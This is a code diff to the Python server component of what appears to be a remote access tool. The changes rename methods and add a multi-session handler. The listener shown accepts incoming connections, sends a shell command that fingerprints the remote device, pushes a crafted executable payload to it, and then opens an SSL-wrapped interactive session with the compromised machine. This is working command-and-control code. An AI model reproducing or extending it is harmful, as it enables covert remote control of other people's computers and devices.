@@ -3,6 +3,7 @@ import helper as h
 import session
 import binascii
 import readline
+from multihandler import MultiHandler
 
 downloads_dir = "../downloads"
 
@@ -72,12 +73,16 @@ class Server:
             return False
 
 
-    def single(self):
+    def start_single_handler(self):
         session = self.listen(False)
         if session:
             session.interact()
         else:
             print "rip"
+
+
+    def start_multi_handler(self):
+        MultiHandler(self)
 
 
     def craft_payload(self,device):
@@ -128,7 +133,7 @@ class Server:
             return (instructions,payload)
 
 
-    def listen(self,is_multi,verbose=True):
+    def listen(self,is_multi):
         #craft shell script
         identification_shell_command = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
         
@@ -137,12 +142,12 @@ class Server:
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind(('0.0.0.0', self.port))
         s.listen(1)
-        if verbose:
+        if is_multi == False:
             h.info_general("Listening on port "+str(self.port)+"...")
 
         conn, addr = s.accept()
         hostAddress = addr[0]
-        if verbose:
+        if is_multi == False:
             h.info_general("Connecting to "+hostAddress)
         conn.send(identification_shell_command)
         device_type = conn.recv(128).strip()
@@ -159,24 +164,25 @@ class Server:
         conn.send(executable)
         conn.close()
         h.info_general("Establishing Secure Connection...")
-        return self.listen_espl(s,device_type)
+        return self.listen_for_executable_payload(s,device_type,is_multi)
 
 
-    def listen_espl(self,s,device_type):
+    def listen_for_executable_payload(self,s,device_type,is_multi):
         # accept connection
         ssl_con, hostAddress = s.accept()
         s.settimeout(5)
-
         ssl_sock = ssl.wrap_socket(ssl_con,
                                  server_side=True,
                                  certfile=".keys/server.crt",
                                  keyfile=".keys/server.key",
                                  ssl_version=ssl.PROTOCOL_SSLv23)
-
         device_name = ssl_sock.recv(50)
+
         if device_name:
             name = h.UNDERLINE_GREEN + device_name + h.ENDC + h.GREEN + "> " + h.ENDC;
             return session.Session(self,ssl_sock,name,device_type)
+        elif is_multi:
+            return None
         else:
             h.info_general("Unable to get computer name")
             raw_input("Press Enter To Continue")
